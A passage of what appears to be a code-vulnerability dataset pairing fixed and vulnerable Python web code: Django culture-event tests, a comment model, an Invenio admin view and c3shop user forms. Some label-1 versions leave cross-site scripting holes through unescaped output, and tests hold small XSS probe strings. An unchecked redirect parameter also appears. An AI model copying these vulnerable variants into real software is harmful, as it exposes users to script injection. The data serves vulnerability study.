self.assertEqual(set_ces[1].title, 'because I can Example CE3', 'Test data not in correct order')\n        self.assertEqual(set_ces[2].title, 'Cats like Example CE2', 'Test data not in correct order')\n        html = response.content.decode('utf8')\n        ce1_pos = html.find(set_ces[0].title)\n        ce2_pos = html.find(set_ces[1].title)\n        ce3_pos = html.find(set_ces[2].title)\n        self.assertGreater(ce2_pos, ce1_pos)\n        self.assertGreater(ce3_pos, ce2_pos)\n\n\n\n# Form tests\nclass CE_EditFormTests(TestCase):\n\n    def test_valid_data(self):\n        # form should be valid\n        form_data = {'title' : 'An example CE',\n                     'description_plain_text' : 'We did culture',\n                     'differences' : 'It went better than last time'}\n        form = forms.CE_EditForm(data=form_data)\n        self.assertTrue(form.is_valid())\n\n    def test_title_missing_data(self):\n        # title is a required field, form should be invalid\n        form_data = {'description_plain_text' : 'We did culture',\n                     'differences' : 'It went better than last time'}\n        form = forms.CE_EditForm(data=form_data)\n        self.assertFalse(form.is_valid())\n\nclass PictureUploadForm(TestCase):\n    def test_valid_data(self):\n        with open('CLAHub/static/test_data/test_pic1.JPG', 'rb') as file:\n            file = file.read()\n            test_image = SimpleUploadedFile('test_data/test_pic1.JPG', file, content_type='image')\n        form_data = {'ce': models.CultureEvent(),\n                     'picture': test_image}\n        form = forms.PictureUploadForm(data=form_data)\n        form.full_clean()\n        self.assertTrue(form.is_valid())\n\n#     def test_not_a_picture_file(self):\n# todo a text file counts as valid image? Rejected at model level, not form level\n#         with open('readme.md', 'rb') as file:\n#             file = file.read()\n#             test_image = SimpleUploadedFile('readme.md', file, content_type='text')\n#         form_data = {'ce': models.CultureEvent(),\n#                      'picture': test_image}\n#         form = forms.PictureUploadForm(data=form_data)\n#         form.full_clean()\n#         self.assertFalse(form.is_valid())\n\n# Model tests\n\nclass CEModelTest(TestCase):\n    def test_string_method(self):\n        ce = models.CultureEvent(title='Example CE1')\n        self.assertEqual(str(ce), 'Example CE1')\n\n\n    def test_repeated_title_not_allowed(self):\n        # CE titles should be unique\n        ce = models.CultureEvent(title='Example CE1',\n                                 description_plain_text='A first CE')\n        ce.save()\n        ce = models.CultureEvent(title='Example CE1',\n                                 description_plain_text='A second CE')\n\n        with self.assertRaises(IntegrityError):\n            ce.save()\n\n    def test_auto_hyperlink(self):\n        settings.auto_cross_reference = True\n        # create 1st CE\n        ce = models.CultureEvent(title='Example CE1',\n                                 description_plain_text='A first CE')\n        ce.save()\n        # create 2nd CE with a hyperlink intended\n        description_two = 'A second CE, that references example ce1'\n        ce = models.CultureEvent(title='Example CE2',\n                                 description_plain_text=description_two)\n        ce.save()\n        self.assertEqual(description_two, ce.description_plain_text)\n        self.assertIn('href', ce.description)\n\n        # create 3rd CE with no hyperlinks intended\n        description_three = 'A second CE, that references no other CEs'\n        ce = models.CultureEvent(title='Example CE2',\n                                 description_plain_text=description_three)\n        self.assertEqual(description_three, ce.description_plain_text)\n        self.assertNotIn('href', ce.description)\n\n    def test_manual_hyperlink(self):\n        settings.auto_cross_reference = False\n        # create 1st CE\n        ce = models.CultureEvent(title='Example CE1',\n                                 description_plain_text='A first CE')\n        ce.save()\n        # create 2nd CE with a hyperlink intended\n        description_two = 'A second CE, that references {example ce1}'\n        ce = models.CultureEvent(title='Example CE2',\n                                 description_plain_text=description_two)\n        ce.save()\n        self.assertEqual(description_two, ce.description_plain_text)\n        self.assertIn('href', ce.description)\n\n        # create 3rd CE with no hyperlinks intended\n        description_three = 'A second CE, that doesn\\'t {reference} example ce1'\n        ce = models.CultureEvent(title='Example CE2',\n                                 description_plain_text=description_three)\n        self.assertEqual(description_three, ce.description_plain_text)\n        self.assertNotIn('href', ce.description)\n\n        # test invalid tags not shown\n        self.assertIn('{reference}', ce.description_plain_text)\n        self.assertNotIn('{reference}', ce.description)\n\n    def test_invalid_HTML_removed(self):\n        settings.auto_cross_reference = True\n        # create 1st CE\n        ce = models.CultureEvent(title='First CE',\n                                 description_plain_text='<strong>Example CE1</strong>'\n                                                        '<a href=\"Dodgywebsite.come\">Click here</a>'\n                                                        '<script>Nasty JS</script>')\n        ce.save()\n        # <script> removed\n        self.assertIn('<script>', ce.description_plain_text)\n        self.assertNotIn('<script>', ce.description)\n\n        # <a> removed\n        self.assertIn('<a href', ce.description_plain_text)\n        self.assertNotIn('<a href', ce.description)\n\n        # <strong> allowed\n        settings.bleach_allowed = ['strong']\n        self.assertIn('<strong>', ce.description_plain_text)\n        self.assertIn('<strong>', ce.description)\n\n\nclass TextsModelTest(TestCase):\n    def test_string_method(self):\n        ce = models.CultureEvent(title='Example CE1')\n        text = models.TextModel(ce=ce, phonetic_text='dja\u014b\u0261o')\n        self.assertEqual(str(text), 'Text for Example CE1')\n\n\n# class PictureModelTest(TestCase):\n    # def test_invalid_file_type(self):\n    #     pic = models.PictureModel(picture='string')\n    #     pic.save()\n    #\n    # def test_valid_upload(self):\n    #     ce = models.CultureEvent(title='Test CE')\n    #     ce.save()\n    #     # image = SimpleUploadedFile('test_image.jpeg', b'file_content',\n    #     #         #                                 content_type='image/jpeg')\n    #     image = 'test_data/pic(1).JPG'  # requires a uploads folder in project dir\n    #     pic = models.PictureModel(ce=ce, picture=image)\n    #     pic.save()\n    #     pic = models.PictureModel.objects.get(ce=ce)\n    #     self.assertEqual(pic.picture, 'test_data/pic(1).JPG')\n\n\n\n    # def test_string_method(self):\n    #     pass\n/n/n/n", "label": 0}, {"id": "a06d85cd0b0964f8469e5c4bc9a6c132aa0b4c37", "code": "/CE/settings.py/n/n\nculture_events_shown_on_home_page = 10\nauto_cross_reference = True/n/n/n", "label": 1}, {"id": "fcefac79e4b7601e81a3b3fe0ad26ab18ee95d7d", "code": "models/comment.py/n/nimport asyncio\n\nimport mistune\nimport markupsafe\nfrom tortoise import fields\nfrom tortoise.query_utils import Q\nfrom arq import create_pool\n\nfrom config import REDIS_URL\nfrom .base import BaseModel\nfrom .mc import cache, clear_mc\nfrom .user import GithubUser\nfrom .consts import K_COMMENT, ONE_HOUR\nfrom .react import ReactMixin, ReactItem\nfrom .signals import comment_reacted\nfrom .utils import RedisSettings\n\nmarkdown = mistune.Markdown()\nMC_KEY_COMMENT_LIST = 'comment:%s:comment_list'\nMC_KEY_N_COMMENTS = 'comment:%s:n_comments'\nMC_KEY_COMMNET_IDS_LIKED_BY_USER = 'react:comment_ids_liked_by:%s:%s'\n\n\nclass Comment(ReactMixin, BaseModel):\n    github_id = fields.IntField()\n    post_id = fields.IntField()\n    ref_id = fields.IntField(default=0)\n    kind = K_COMMENT\n\n    class Meta:\n        table = 'comments'\n\n    async def set_content(self, content):\n        return await self.set_props_by_key('content', content)\n\n    async def save(self, *args, **kwargs):\n        content = kwargs.pop('content', None)\n        if content is not None:\n            await self.set_content(content)\n        return await super().save(*args, **kwargs)\n\n    @property\n    async def content(self):\n        rv = await self.get_props_by_key('content')\n        if rv:\n            return rv.decode('utf-8')\n\n    @property\n    async def html_content(self):\n        content = markupsafe.escape(await self.content)\n        if not content:\n            return ''\n        return markdown(content)\n\n    async def clear_mc(self):\n        for key in (MC_KEY_N_COMMENTS, MC_KEY_COMMENT_LIST):\n            await clear_mc(key % self.post_id)\n\n    @property\n    async def user(self):\n        return await GithubUser.get(gid=self.github_id)\n\n    @property\n    async def n_likes(self):\n        return (await self.stats).love_count\n\n\nclass CommentMixin:\n    async def add_comment(self, user_id, content, ref_id=0):\n        obj = await Comment.create(github_id=user_id, post_id=self.id,\n                                   ref_id=ref_id)\n        redis = await create_pool(RedisSettings.from_url(REDIS_URL))\n        await asyncio.gather(\n            obj.set_content(content),\n            redis.enqueue_job('mention_users', self.id, content, user_id),\n            return_exceptions=True\n        )\n        return obj\n\n    async def del_comment(self, user_id, comment_id):\n        c = await Comment.get(id=comment_id)\n        if c and c.github_id == user_id and c.post_id == self.id:\n            await c.delete()\n            return True\n        return False\n\n    @property\n    @cache(MC_KEY_COMMENT_LIST % ('{self.id}'))\n    async def comments(self):\n        return await Comment.sync_filter(post_id=self.id, orderings=['-id'])\n\n    @property\n    @cache(MC_KEY_N_COMMENTS % ('{self.id}'))\n    async def n_comments(self):\n        return await Comment.filter(post_id=self.id).count()\n\n    @cache(MC_KEY_COMMNET_IDS_LIKED_BY_USER % (\n        '{user_id}', '{self.id}'), ONE_HOUR)\n    async def comment_ids_liked_by(self, user_id):\n        cids = [c.id for c in await self.comments]\n        if not cids:\n            return []\n        queryset = await ReactItem.filter(\n            Q(user_id=user_id), Q(target_id__in=cids),\n            Q(target_kind=K_COMMENT))\n        return [item.target_id for item in queryset]\n\n\n@comment_reacted.connect\nasync def update_comment_list_cache(_, user_id, comment_id):\n    comment = await Comment.cache(comment_id)\n    if comment:\n        asyncio.gather(\n            clear_mc(MC_KEY_COMMENT_LIST % comment.post_id),\n            clear_mc(MC_KEY_COMMNET_IDS_LIKED_BY_USER % (\n                user_id, comment.post_id)),\n            return_exceptions=True\n        )\n/n/n/n", "label": 0}, {"id": "fcefac79e4b7601e81a3b3fe0ad26ab18ee95d7d", "code": "/models/comment.py/n/nimport asyncio\n\nimport mistune\nfrom tortoise import fields\nfrom tortoise.query_utils import Q\nfrom arq import create_pool\n\nfrom config import REDIS_URL\nfrom .base import BaseModel\nfrom .mc import cache, clear_mc\nfrom .user import GithubUser\nfrom .consts import K_COMMENT, ONE_HOUR\nfrom .react import ReactMixin, ReactItem\nfrom .signals import comment_reacted\nfrom .utils import RedisSettings\n\nmarkdown = mistune.Markdown()\nMC_KEY_COMMENT_LIST = 'comment:%s:comment_list'\nMC_KEY_N_COMMENTS = 'comment:%s:n_comments'\nMC_KEY_COMMNET_IDS_LIKED_BY_USER = 'react:comment_ids_liked_by:%s:%s'\n\n\nclass Comment(ReactMixin, BaseModel):\n    github_id = fields.IntField()\n    post_id = fields.IntField()\n    ref_id = fields.IntField(default=0)\n    kind = K_COMMENT\n\n    class Meta:\n        table = 'comments'\n\n    async def set_content(self, content):\n        return await self.set_props_by_key('content', content)\n\n    async def save(self, *args, **kwargs):\n        content = kwargs.pop('content', None)\n        if content is not None:\n            await self.set_content(content)\n        return await super().save(*args, **kwargs)\n\n    @property\n    async def content(self):\n        rv = await self.get_props_by_key('content')\n        if rv:\n            return rv.decode('utf-8')\n\n    @property\n    async def html_content(self):\n        content = await self.content\n        if not content:\n            return ''\n        return markdown(content)\n\n    async def clear_mc(self):\n        for key in (MC_KEY_N_COMMENTS, MC_KEY_COMMENT_LIST):\n            await clear_mc(key % self.post_id)\n\n    @property\n    async def user(self):\n        return await GithubUser.get(gid=self.github_id)\n\n    @property\n    async def n_likes(self):\n        return (await self.stats).love_count\n\n\nclass CommentMixin:\n    async def add_comment(self, user_id, content, ref_id=0):\n        obj = await Comment.create(github_id=user_id, post_id=self.id,\n                                   ref_id=ref_id)\n        redis = await create_pool(RedisSettings.from_url(REDIS_URL))\n        await asyncio.gather(\n            obj.set_content(content),\n            redis.enqueue_job('mention_users', self.id, content, user_id),\n            return_exceptions=True\n        )\n        return obj\n\n    async def del_comment(self, user_id, comment_id):\n        c = await Comment.get(id=comment_id)\n        if c and c.github_id == user_id and c.post_id == self.id:\n            await c.delete()\n            return True\n        return False\n\n    @property\n    @cache(MC_KEY_COMMENT_LIST % ('{self.id}'))\n    async def comments(self):\n        return await Comment.sync_filter(post_id=self.id, orderings=['-id'])\n\n    @property\n    @cache(MC_KEY_N_COMMENTS % ('{self.id}'))\n    async def n_comments(self):\n        return await Comment.filter(post_id=self.id).count()\n\n    @cache(MC_KEY_COMMNET_IDS_LIKED_BY_USER % (\n        '{user_id}', '{self.id}'), ONE_HOUR)\n    async def comment_ids_liked_by(self, user_id):\n        cids = [c.id for c in await self.comments]\n        if not cids:\n            return []\n        queryset = await ReactItem.filter(\n            Q(user_id=user_id), Q(target_id__in=cids),\n            Q(target_kind=K_COMMENT))\n        return [item.target_id for item in queryset]\n\n\n@comment_reacted.connect\nasync def update_comment_list_cache(_, user_id, comment_id):\n    comment = await Comment.cache(comment_id)\n    if comment:\n        asyncio.gather(\n            clear_mc(MC_KEY_COMMENT_LIST % comment.post_id),\n            clear_mc(MC_KEY_COMMNET_IDS_LIKED_BY_USER % (\n                user_id, comment.post_id)),\n            return_exceptions=True\n        )\n/n/n/n", "label": 1}, {"id": "361def20617cde5a1897c2e81b70bfadaabae608", "code": "invenio_records/admin.py/n/n# -*- coding: utf-8 -*-\n#\n# This file is part of Invenio.\n# Copyright (C) 2015-2018 CERN.\n#\n# Invenio is free software; you can redistribute it and/or modify it\n# under the terms of the MIT License; see LICENSE file for more details.\n\n\"\"\"Admin model views for records.\"\"\"\n\nimport json\n\nfrom flask import flash\nfrom flask_admin.contrib.sqla import ModelView\nfrom flask_babelex import gettext as _\nfrom invenio_admin.filters import FilterConverter\nfrom invenio_db import db\nfrom markupsafe import Markup\nfrom sqlalchemy.exc import SQLAlchemyError\n\nfrom .api import Record\nfrom .models import RecordMetadata\n\n\nclass RecordMetadataModelView(ModelView):\n    \"\"\"Records admin model view.\"\"\"\n\n    filter_converter = FilterConverter()\n    can_create = False\n    can_edit = False\n    can_delete = True\n    can_view_details = True\n    column_list = ('id', 'version_id', 'updated', 'created',)\n    column_details_list = ('id', 'version_id', 'updated', 'created', 'json')\n    column_labels = dict(\n        id=_('UUID'),\n        version_id=_('Revision'),\n        json=_('JSON'),\n    )\n    column_formatters = dict(\n        version_id=lambda v, c, m, p: m.version_id-1,\n        json=lambda v, c, m, p: Markup(\"<pre>{0}</pre>\").format(\n            json.dumps(m.json, indent=2, sort_keys=True))\n    )\n    column_filters = ('created', 'updated', )\n    column_default_sort = ('updated', True)\n    page_size = 25\n\n    def delete_model(self, model):\n        \"\"\"Delete a record.\"\"\"\n        try:\n            if model.json is None:\n                return True\n            record = Record(model.json, model=model)\n            record.delete()\n            db.session.commit()\n        except SQLAlchemyError as e:\n            if not self.handle_view_exception(e):\n                flash(_('Failed to delete record. %(error)s', error=str(e)),\n                      category='error')\n            db.session.rollback()\n            return False\n        return True\n\nrecord_adminview = dict(\n    modelview=RecordMetadataModelView,\n    model=RecordMetadata,\n    category=_('Records'))\n/n/n/ntests/test_admin.py/n/n# -*- coding: utf-8 -*-\n#\n# This file is part of Invenio.\n# Copyright (C) 2015-2018 CERN.\n#\n# Invenio is free software; you can redistribute it and/or modify it\n# under the terms of the MIT License; see LICENSE file for more details.\n\n\"\"\"Test admin interface.\"\"\"\n\nfrom __future__ import absolute_import, print_function\n\nimport uuid\n\nfrom flask import url_for\nfrom flask_admin import Admin, menu\nfrom mock import patch\nfrom sqlalchemy.exc import SQLAlchemyError\n\nfrom invenio_records.admin import record_adminview\nfrom invenio_records.api import Record\n\n\ndef test_admin(app, db):\n    \"\"\"Test flask-admin interace.\"\"\"\n    admin = Admin(app, name=\"Test\")\n\n    assert 'model' in record_adminview\n    assert 'modelview' in record_adminview\n\n    # Register both models in admin\n    model = record_adminview.pop('model')\n    view = record_adminview.pop('modelview')\n    admin.add_view(view(model, db.session, **record_adminview))\n\n    # Check if generated admin menu contains the correct items\n    menu_items = {str(item.name): item for item in admin.menu()}\n    assert 'Records' in menu_items\n    assert menu_items['Records'].is_category()\n\n    submenu_items = {\n        str(item.name): item for item in menu_items['Records'].get_children()}\n    assert 'Record Metadata' in submenu_items\n    assert isinstance(submenu_items['Record Metadata'], menu.MenuView)\n\n    # Create a test record.\n    rec_uuid = str(uuid.uuid4())\n    Record.create({'title': 'test<script>alert(1);</script>'}, id_=rec_uuid)\n    db.session.commit()\n\n    with app.test_request_context():\n        index_view_url = url_for('recordmetadata.index_view')\n        delete_view_url = url_for('recordmetadata.delete_view')\n        detail_view_url = url_for(\n            'recordmetadata.details_view', id=rec_uuid)\n\n    with app.test_client() as client:\n        # List index view and check record is there.\n        res = client.get(index_view_url)\n        assert res.status_code == 200\n\n        # Check for XSS in JSON output\n        res = client.get(detail_view_url)\n        assert res.status_code == 200\n        data = res.get_data(as_text=True)\n        assert '<pre>{' in data\n        assert '}</pre>' in data\n        assert '<script>alert(1);</script>' not in data\n\n        # Fake a problem with SQLAlchemy.\n        with patch('invenio_records.models.RecordMetadata') as db_mock:\n            db_mock.side_effect = SQLAlchemyError()\n            res = client.post(\n                delete_view_url, data={'id': rec_uuid}, follow_redirects=True)\n            assert res.status_code == 200\n\n        # Delete it.\n        res = client.post(\n            delete_view_url, data={'id': rec_uuid}, follow_redirects=True)\n        assert res.status_code == 200\n\n        # View the delete record\n        res = client.get(detail_view_url)\n        assert res.status_code == 200\n        assert '<pre>null</pre>' in res.get_data(as_text=True)\n\n        # Delete it again\n        res = client.post(\n            delete_view_url, data={'id': rec_uuid}, follow_redirects=True)\n        assert res.status_code == 200\n/n/n/n", "label": 0}, {"id": "361def20617cde5a1897c2e81b70bfadaabae608", "code": "/invenio_records/admin.py/n/n# -*- coding: utf-8 -*-\n#\n# This file is part of Invenio.\n# Copyright (C) 2015-2018 CERN.\n#\n# Invenio is free software; you can redistribute it and/or modify it\n# under the terms of the MIT License; see LICENSE file for more details.\n\n\"\"\"Admin model views for records.\"\"\"\n\nimport json\n\nfrom flask import flash\nfrom flask_admin.contrib.sqla import ModelView\nfrom flask_babelex import gettext as _\nfrom invenio_admin.filters import FilterConverter\nfrom invenio_db import db\nfrom markupsafe import Markup\nfrom sqlalchemy.exc import SQLAlchemyError\n\nfrom .api import Record\nfrom .models import RecordMetadata\n\n\nclass RecordMetadataModelView(ModelView):\n    \"\"\"Records admin model view.\"\"\"\n\n    filter_converter = FilterConverter()\n    can_create = False\n    can_edit = False\n    can_delete = True\n    can_view_details = True\n    column_list = ('id', 'version_id', 'updated', 'created',)\n    column_details_list = ('id', 'version_id', 'updated', 'created', 'json')\n    column_labels = dict(\n        id=_('UUID'),\n        version_id=_('Revision'),\n        json=_('JSON'),\n    )\n    column_formatters = dict(\n        version_id=lambda v, c, m, p: m.version_id-1,\n        json=lambda v, c, m, p: Markup(\"<pre>{0}</pre>\".format(\n            json.dumps(m.json, indent=2, sort_keys=True)))\n    )\n    column_filters = ('created', 'updated', )\n    column_default_sort = ('updated', True)\n    page_size = 25\n\n    def delete_model(self, model):\n        \"\"\"Delete a record.\"\"\"\n        try:\n            if model.json is None:\n                return True\n            record = Record(model.json, model=model)\n            record.delete()\n            db.session.commit()\n        except SQLAlchemyError as e:\n            if not self.handle_view_exception(e):\n                flash(_('Failed to delete record. %(error)s', error=str(e)),\n                      category='error')\n            db.session.rollback()\n            return False\n        return True\n\nrecord_adminview = dict(\n    modelview=RecordMetadataModelView,\n    model=RecordMetadata,\n    category=_('Records'))\n/n/n/n/tests/test_admin.py/n/n# -*- coding: utf-8 -*-\n#\n# This file is part of Invenio.\n# Copyright (C) 2015-2018 CERN.\n#\n# Invenio is free software; you can redistribute it and/or modify it\n# under the terms of the MIT License; see LICENSE file for more details.\n\n\"\"\"Test admin interface.\"\"\"\n\nfrom __future__ import absolute_import, print_function\n\nimport uuid\n\nfrom flask import url_for\nfrom flask_admin import Admin, menu\nfrom mock import patch\nfrom sqlalchemy.exc import SQLAlchemyError\n\nfrom invenio_records.admin import record_adminview\nfrom invenio_records.api import Record\n\n\ndef test_admin(app, db):\n    \"\"\"Test flask-admin interace.\"\"\"\n    admin = Admin(app, name=\"Test\")\n\n    assert 'model' in record_adminview\n    assert 'modelview' in record_adminview\n\n    # Register both models in admin\n    model = record_adminview.pop('model')\n    view = record_adminview.pop('modelview')\n    admin.add_view(view(model, db.session, **record_adminview))\n\n    # Check if generated admin menu contains the correct items\n    menu_items = {str(item.name): item for item in admin.menu()}\n    assert 'Records' in menu_items\n    assert menu_items['Records'].is_category()\n\n    submenu_items = {\n        str(item.name): item for item in menu_items['Records'].get_children()}\n    assert 'Record Metadata' in submenu_items\n    assert isinstance(submenu_items['Record Metadata'], menu.MenuView)\n\n    # Create a test record.\n    rec_uuid = str(uuid.uuid4())\n    Record.create({'title': 'test'}, id_=rec_uuid)\n    db.session.commit()\n\n    with app.test_request_context():\n        index_view_url = url_for('recordmetadata.index_view')\n        delete_view_url = url_for('recordmetadata.delete_view')\n        detail_view_url = url_for(\n            'recordmetadata.details_view', id=rec_uuid)\n\n    with app.test_client() as client:\n        # List index view and check record is there.\n        res = client.get(index_view_url)\n        assert res.status_code == 200\n\n        # Fake a problem with SQLAlchemy.\n        with patch('invenio_records.models.RecordMetadata') as db_mock:\n            db_mock.side_effect = SQLAlchemyError()\n            res = client.post(\n                delete_view_url, data={'id': rec_uuid}, follow_redirects=True)\n            assert res.status_code == 200\n\n        # Delete it.\n        res = client.post(\n            delete_view_url, data={'id': rec_uuid}, follow_redirects=True)\n        assert res.status_code == 200\n\n        # View the delete record\n        res = client.get(detail_view_url)\n        assert res.status_code == 200\n        assert '<pre>null</pre>' in res.get_data(as_text=True)\n\n        # Delete it again\n        res = client.post(\n            delete_view_url, data={'id': rec_uuid}, follow_redirects=True)\n        assert res.status_code == 200\n/n/n/n", "label": 1}, {"id": "6e330d4d44bbfdfce9993dffea97008276771600", "code": "c3shop/frontpage/management/edit_user.py/n/nfrom django.http import HttpRequest, HttpResponseForbidden, HttpResponseBadRequest\nfrom django.utils.html import escape\nfrom django.shortcuts import redirect\nfrom django.contrib.auth.models import User\nfrom . import page_skeleton, magic\nfrom .form import Form, TextField, PlainText, TextArea, SubmitButton, NumberField, PasswordField, CheckBox, CheckEnum\nfrom ..models import Profile, Media\nfrom ..uitools.dataforge import get_csrf_form_element\nfrom .magic import get_current_user\nimport logging\n\n\ndef render_edit_page(http_request: HttpRequest, action_url: str):\n\n    user_id = None\n    profile: Profile = None\n    if http_request.GET.get(\"user_id\"):\n        user_id = int(http_request.GET[\"user_id\"])\n    if user_id is not None:\n        profile = Profile.objects.get(pk=user_id)\n    f = Form()\n    f.action_url = action_url\n    if profile:\n        f.add_content(PlainText('<h3>Edit user \"' + profile.authuser.username + '\"</h3>'))\n        f.add_content(PlainText('<a href=\"/admin/media/select?action_url=/admin/actions/change-user-avatar'\n                                '&payload=' + str(user_id) + '\"><img class=\"button-img\" alt=\"Change avatar\" '\n                                'src=\"/staticfiles/frontpage/change-avatar.png\"/></a><br />'))\n    else:\n        f.add_content(PlainText('<h3>Add new user</h3>'))\n    if not profile:\n        f.add_content(PlainText(\"username (can't be edited later on): \"))\n        f.add_content(TextField(name='username'))\n    if http_request.GET.get('fault') and profile:\n        f.add_content(PlainText(\"Unable to edit user due to: \" + str(http_request.GET['fault'])))\n    elif http_request.GET.get('fault'):\n        f.add_content(PlainText(\"Unable to add user due to: \" + str(http_request.GET['fault'])))\n    current_user: Profile = get_current_user(http_request)\n    if current_user.rights > 3:\n        if not profile:\n            f.add_content(CheckBox(name=\"active\", text=\"User Active\", checked=CheckEnum.CHECKED))\n        else:\n            m: CheckEnum = CheckEnum.CHECKED\n            if not profile.active:\n                m = CheckEnum.NOT_CHECKED\n            f.add_content(CheckBox(name=\"active\", text=\"User Active\", checked=m))\n    if profile:\n        f.add_content(PlainText(\"Email address: \"))\n        f.add_content(TextField(name='email', button_text=str(profile.authuser.email)))\n        f.add_content(PlainText(\"Display name: \"))\n        f.add_content(TextField(name='display_name', button_text=profile.displayName))\n        f.add_content(PlainText('DECT: '))\n        f.add_content(NumberField(name='dect', button_text=str(profile.dect), minimum=0))\n        f.add_content(PlainText('Number of allowed reservations: '))\n        f.add_content(NumberField(name='allowed_reservations', button_text=str(profile.number_of_allowed_reservations), minimum=0))\n        f.add_content(PlainText(\"Rights: \"))\n        f.add_content(NumberField(name=\"rights\", button_text=str(profile.rights), minimum=0, maximum=4))\n        f.add_content(PlainText('Notes:<br/>'))\n        f.add_content(TextArea(name='notes', text=str(profile.notes)))\n    else:\n        f.add_content(PlainText(\"Email address: \"))\n        f.add_content(TextField(name='email'))\n        f.add_content(PlainText(\"Display name: \"))\n        f.add_content(TextField(name='display_name'))\n        f.add_content(PlainText('DECT: '))\n        f.add_content(NumberField(name='dect', minimum=0))\n        f.add_content(PlainText('Number of allowed reservations: '))\n        f.add_content(NumberField(name='allowed_reservations', button_text=str(1), minimum=0))\n        f.add_content(PlainText(\"Rights: \"))\n        f.add_content(NumberField(name=\"rights\", button_text=str(0), minimum=0, maximum=4))\n        f.add_content(PlainText('Notes:<br/>'))\n        f.add_content(TextArea(name='notes', placeholder=\"Hier k\u00f6nnte ihre Werbung stehen\"))\n    if profile:\n        f.add_content(PlainText('<br /><br />Change password (leave blank in order to not change it):'))\n    else:\n        f.add_content(PlainText('<br />Choose a password: '))\n    f.add_content(PasswordField(name='password', required=False))\n    f.add_content(PlainText('Confirm your password: '))\n    f.add_content(PasswordField(name='confirm_password', required=False))\n    f.add_content(PlainText(get_csrf_form_element(http_request)))\n    f.add_content(SubmitButton())\n    # a = page_skeleton.render_headbar(http_request, \"Edit User\")\n    a = '<div class=\"w3-row w3-padding-64 w3-twothird w3-container admin-popup\">'\n    a += f.render_html(http_request)\n    # a += page_skeleton.render_footer(http_request)\n    a += \"</div>\"\n    return a\n\n\ndef check_password_conformity(pw1: str, pw2: str):\n    if not (pw1 == pw2):\n        return False\n    if len(pw1) < 6:\n        return False\n    if pw1.isupper():\n        return False\n    if pw1.islower():\n        return False\n    return True\n\n\ndef recreate_form(reason: str):\n    return redirect('/admin/users/edit?fault=' + str(reason))\n\n\ndef action_save_user(request: HttpRequest, default_forward_url: str = \"/admin/users\"):\n    \"\"\"\n    This functions saves the changes to the user or adds a new one. It completely creates the HttpResponse\n    :param request: the HttpRequest\n    :param default_forward_url: The URL to forward to if nothing was specified\n    :return: The crafted HttpResponse\n    \"\"\"\n    forward_url = default_forward_url\n    if request.GET.get(\"redirect\"):\n        forward_url = request.GET[\"redirect\"]\n    if not request.user.is_authenticated:\n        return HttpResponseForbidden()\n    profile = Profile.objects.get(authuser=request.user)\n    if profile.rights < 2:\n        return HttpResponseForbidden()\n    try:\n        if request.GET.get(\"user_id\"):\n            pid = int(request.GET[\"user_id\"])\n            displayname = str(request.POST[\"display_name\"])\n            dect = int(request.POST[\"dect\"])\n            notes = str(request.POST[\"notes\"])\n            pw1 = str(request.POST[\"password\"])\n            pw2 = str(request.POST[\"confirm_password\"])\n            mail = str(request.POST[\"email\"])\n            rights = int(request.POST[\"rights\"])\n            user: Profile = Profile.objects.get(pk=pid)\n            user.displayName = escape(displayname)\n            user.dect = dect\n            user.notes = escape(notes)\n            user.rights = rights\n            user.number_of_allowed_reservations = int(request.POST[\"allowed_reservations\"])\n            if request.POST.get(\"active\"):\n                user.active = magic.parse_bool(request.POST[\"active\"])\n            au: User = user.authuser\n            if check_password_conformity(pw1, pw2):\n                logging.log(logging.INFO, \"Set password for user: \" + user.displayName)\n                au.set_password(pw1)\n            else:\n                logging.log(logging.INFO, \"Failed to set password for: \" + user.displayName)\n            au.email = escape(mail)\n            au.save()\n            user.save()\n        else:\n            # assume new user\n            username = str(request.POST[\"username\"])\n            displayname = str(request.POST[\"display_name\"])\n            dect = int(request.POST[\"dect\"])\n            notes = str(request.POST[\"notes\"])\n            pw1 = str(request.POST[\"password\"])\n            pw2 = str(request.POST[\"confirm_password\"])\n            mail = str(request.POST[\"email\"])\n            rights = int(request.POST[\"rights\"])\n            if not check_password_conformity(pw1, pw2):\n                recreate_form('password mismatch')\n            auth_user: User = User.objects.create_user(username=escape(username), email=escape(mail), password=pw1)\n            auth_user.save()\n            user: Profile = Profile()\n            user.rights = rights\n            user.number_of_allowed_reservations = int(request.POST[\"allowed_reservations\"])\n            user.displayName = escape(displayname)\n            user.authuser = auth_user\n            user.dect = dect\n            user.notes = escape(notes)\n            user.active = True\n            user.save()\n            pass\n        pass\n    except Exception as e:\n        return HttpResponseBadRequest(str(e))\n    return redirect(forward_url)\n/n/n/nc3shop/frontpage/management/mediatools/media_actions.py/n/nfrom datetime import date, time\nfrom django.shortcuts import redirect\nfrom django.http import HttpRequest, HttpResponseBadRequest\nfrom django.utils.html import escape\nfrom frontpage.models import Profile, Media, MediaUpload\nfrom frontpage.management.magic import compile_markdown, get_current_user\n\nimport logging\nimport ntpath\nimport os\nimport math\nimport PIL\nfrom PIL import Image\n\n\nPATH_TO_UPLOAD_FOLDER_ON_DISK: str = \"/usr/local/www/focweb/\"\nIMAGE_SCALE = 64\n\n\ndef action_change_user_avatar(request: HttpRequest):\n    try:\n        user_id = int(request.GET[\"payload\"])\n        media_id = int(request.GET[\"media_id\"])\n        user: Profile = Profile.objects.get(pk=int(user_id))\n        u: Profile = get_current_user(request)\n        if not (u == user) and u.rights < 4:\n            return redirect(\"/admin?error='You're not allowed to edit other users.'\")\n        medium = Media.objects.get(pk=int(media_id))\n        user.avatarMedia = medium\n        user.save()\n    except Exception as e:\n        return redirect(\"/admin?error=\" + str(e))\n    return redirect(\"/admin/users\")\n\n\ndef handle_file(u: Profile, headline: str, category: str, text: str, file):\n    m: Media = Media()\n    upload_base_path: str = 'uploads/' + str(date.today().year)\n    high_res_file_name = upload_base_path + '/HIGHRES_' + ntpath.basename(file.name.replace(\" \", \"_\"))\n    low_res_file_name = upload_base_path + '/LOWRES_' + ntpath.basename(file.name.replace(\" \", \"_\"))\n    if not os.path.exists(PATH_TO_UPLOAD_FOLDER_ON_DISK + upload_base_path):\n        os.makedirs(PATH_TO_UPLOAD_FOLDER_ON_DISK + upload_base_path)\n    with open(high_res_file_name, 'wb+') as destination:\n        for chunk in file.chunks():\n            destination.write(chunk)\n    # TODO crop image\n    original = Image.open(high_res_file_name)\n    width, height = original.size\n    diameter = math.sqrt(math.pow(width, 2) + math.pow(height, 2))\n    width /= diameter\n    height /= diameter\n    width *= IMAGE_SCALE\n    height *= IMAGE_SCALE\n    cropped = original.resize((int(width), int(height)), PIL.Image.LANCZOS)\n    cropped.save(low_res_file_name)\n    m.text = escape(text)\n    m.cachedText = compile_markdown(escape(text))\n    m.category = escape(category)\n    